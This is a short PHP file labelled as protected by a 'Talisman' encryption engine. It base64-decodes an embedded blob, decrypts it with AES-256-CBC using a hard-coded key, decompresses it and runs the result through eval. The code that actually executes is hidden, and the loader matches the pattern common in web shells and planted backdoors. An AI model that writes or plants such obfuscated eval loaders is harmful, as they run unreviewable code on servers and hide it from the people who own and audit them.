<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k08d0e = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p1151e = base64_decode('OBic6FI5gubeseEMqiFJ82Znc3hNWlN0ZTJGYjlSNHZxTFFLQy92bDBXNW91RUtwQmRmWU5EbGlTSjNQZmQ5OFhvcmNKN09KK2VDcFgvcTZSZWpEQ1pRRlVqTzBiV1RXcng1Q1l5TlZEb0lQaytVZU1JY0sxeDIyRGZ2Yno5V08reWtYRm5JbDhXeEdPeE1lbk9qOXpZcDRKTVdzYi9uR3ZuLytwWUZKWjR4bTEvcGY4MjRjK1c2a29qTWNIbzlPQ3BRcDdROCtMb3hQM2RJSXdpU0RYVHV4L2Q2V1VjbVhOQmMzcUhyOXNPMUw5cWNSc015cTBMWllaKzV6bmZJTitCWUJqOFV3Y29Vd2RZYWtvOTl3azY3UEl5TzVCVlFvNWV5eXltRjUyMTZzeCtZMXlUZ05yOWw0VnpoUlpZY2dXY1hIUk5JUXVIM3NDdWY4');
$ifb234 = openssl_cipher_iv_length('aes-256-cbc');
$vb7e86 = substr($p1151e, 0, $ifb234);
$c82263 = substr($p1151e, $ifb234);
eval('?>'.gzinflate(openssl_decrypt($c82263, 'aes-256-cbc', $k08d0e, 0, $vb7e86)));